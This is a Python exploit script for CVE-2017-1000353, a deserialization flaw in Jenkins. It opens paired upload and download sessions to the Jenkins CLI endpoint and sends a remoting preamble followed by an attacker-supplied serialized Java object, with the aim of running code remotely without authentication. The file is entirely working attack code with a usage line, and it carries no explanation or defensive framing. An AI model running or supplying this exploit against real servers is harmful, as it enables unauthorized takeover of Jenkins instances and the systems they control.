#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import uuid
import threading
import logging


logging.basicConfig(level=logging.DEBUG, format="%(threadName)s - %(message)s")
log = logging.getLogger(__file__)

 
class CVE_2017_1000353(object):

    def __init__(self, jenkins_cli_uri, java_serialization_file):
        self.jenkins_cli_uri = jenkins_cli_uri
        self.jenkins_sesuuid = str(uuid.uuid4())
        self.java_serialization_file = java_serialization_file

        self.upload_event = threading.Event()
        self.download_event = threading.Event()

    def exploit(self):
        threads = [
            threading.Thread(name='download', target=self.download),
            threading.Thread(name='upload', target=self.upload)
        ]

        for thread in threads: thread.start()
        for thread in threads: thread.join()

    def download(self):
        headers = {
            'Side' : 'download',
            'Session': self.jenkins_sesuuid
        }
        response = requests.post(self.jenkins_cli_uri, headers=headers, data=self.generate_download_payload())
        self.upload_event.set()
        self.download_event.wait()
        log.info(response.content)

    def upload(self, data='asdf'):
        headers = {
            'Side' : 'upload',
            'Session': self.jenkins_sesuuid
        }

        self.upload_event.wait(0.5)
        response = requests.post(self.jenkins_cli_uri, headers=headers, data=self.generate_upload_payload())
        self.download_event.set()
        log.info(response.content)

    def generate_download_payload(self):
        return b""

    def generate_upload_payload(self):
        payload = [
            b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=',
            b'\x00\x00\x00\x00',
            open(self.java_serialization_file, "rb").read()
        ]

        return b''.join(payload)

 
if __name__ == "__main__":
    import sys

    if len(sys.argv) != 3:
        log.info("[*] python {} <http://127.0.0.1:8080/cli> <java_serialization_data.bin>".format(sys.argv[0]))
        sys.exit(1)

    url = sys.argv[1]
    java_serialization_data_bin = sys.argv[2]

    jenkins = CVE_2017_1000353(url, java_serialization_data_bin)
    jenkins.exploit()